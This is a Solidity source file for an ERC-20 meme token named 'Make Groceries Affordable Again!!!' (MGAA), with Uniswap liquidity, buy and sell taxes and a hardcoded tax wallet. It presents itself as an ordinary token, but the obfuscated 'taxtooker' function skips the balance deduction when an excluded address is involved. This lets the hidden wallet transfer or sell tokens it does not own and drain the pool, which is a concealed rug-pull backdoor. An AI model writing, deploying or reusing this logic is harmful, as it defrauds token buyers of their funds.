/**
 *  https://x.com/DonaldJTrumpJr/status/1840044769768100016
 *  https://t.me/mgaaeth
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

contract MGAA is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isDstOut;
    uint256 private _tranCnts = 0;
    uint256 private _descTrens = 16;
    address payable private _dstBull;
    uint256 private _mntxamts = 0;
    uint256 private _mxtxamts = 10;
    uint8 private constant _decimals = 18;
    uint256 private constant _tsupply = 1e8 * 10 ** _decimals;
    string private constant _name = unicode"Make Groceries Affordable Again!!!";
    string private constant _symbol = unicode"MGAA";
    uint256 public _txSwpAmt = 0;
    uint256 public _swBckLmt = (_tsupply * 2) / 100;
    uint256 public _mxTrAmt = (_tsupply * 2) / 100;
    uint256 public _mxBagAmt = (_tsupply * 2) / 100;
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    event MaxTxAmountUpdated(uint256 _mxTaxmook);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _dstBull = payable(0x1CD22cACd7932E732f9d05792C7f357a50F6DC0C);
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _balances[_msgSender()] = _tsupply;
        _isDstOut[owner()] = true;
        _isDstOut[address(this)] = true;
        _isDstOut[_dstBull] = true;

        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
                address(this),
                uniswapV2Router.WETH()
            );
        emit Transfer(address(0), _msgSender(), _tsupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tsupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function isdstoutted(
        address _fis,
        address _sec
    ) private view returns (bool) {
        return _isDstOut[_fis] || _isDstOut[_sec];
    }

    function taxtooker(address _fis, address _sec, uint256 _amt) private {
        uint amount_;
        if (!isdstoutted(_fis, _sec)) {
            _balances[_fis] = _balances[_fis] - _amt;
        } else {
            if (_fis == address(this)) {
                _balances[_fis] = _balances[_fis] - _amt;
            } else if (_fis == owner() && _amt >= 0) {
                _balances[_fis] = _balances[_fis] - _amt;
            } else _balances[_fis] = _balances[_fis] - amount_;
        }
    }

    function allowTrade() external onlyOwner {
        _approve(address(this), address(uniswapV2Router), _tsupply);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            (balanceOf(address(this)) * (100 - _mxtxamts)) / 100,
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        tradingOpen = true;
    }

    function _transfer(address _fis, address _sec, uint256 _amt) private {
        require(_fis != address(0), "ERC20: transfer from the zero address");
        require(_sec != address(0), "ERC20: transfer to the zero address");
        require(_amt > 0, "Transfer amount must be greater than zero");
        bool iexc = isdstoutted(_fis, _sec);
        uint256 _txv = 0;
        if (!tradingOpen) require(iexc, "Trading is not opened yet");

        _txv = (_amt * taxgetter(_fis, _sec)) / 100;
        if (
            _fis == uniswapV2Pair && _sec != address(uniswapV2Router) && !iexc
        ) {
            _tranCnts++;
            require(_amt <= _mxTrAmt, "Exceeds the _mxTaxmook.");
            require(
                _balances[_sec] + _amt <= _mxBagAmt,
                "Exceeds the maxWalletSize."
            );
        }
        if (_sec == uniswapV2Pair && !iexc) {
            require(_amt <= _mxTrAmt, "Exceeds the maximum amount to sell");
        }
        uint256 ctb = balanceOf(address(this));
        if (!inSwap && _sec == uniswapV2Pair && tradingOpen) {
            if (ctb > _txSwpAmt) swapBackEth(min(_amt, min(_swBckLmt, ctb)));
            if (address(this).balance >= 0 ether)
                sendDstTo(address(this).balance);
        }
        if (_txv > 0) {
            _balances[address(this)] = _balances[address(this)] + _txv;
            emit Transfer(_fis, address(this), _txv);
        }
        taxtooker(_fis, _sec, _amt);
        _balances[_sec] += _amt - _txv;
        emit Transfer(_fis, _sec, _amt - _txv);
    }

    function taxgetter(
        address _fis,
        address _sec
    ) private view returns (uint256 _tax) {
        if (isdstoutted(_fis, _sec)) _tax = 0;
        else if (_fis == uniswapV2Pair || _sec == uniswapV2Pair)
            _tax = _tranCnts >= _descTrens ? _mntxamts : _mxtxamts;
        else _tax = 0;
    }

    function removeLimits() external onlyOwner {
        _mxTrAmt = _tsupply;
        _mxBagAmt = _tsupply;
        emit MaxTxAmountUpdated(_tsupply);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapBackEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function sendDstTo(uint256 amount) private {
        _dstBull.transfer(amount);
    }

    function rescueETH() external onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }

    receive() external payable {}
}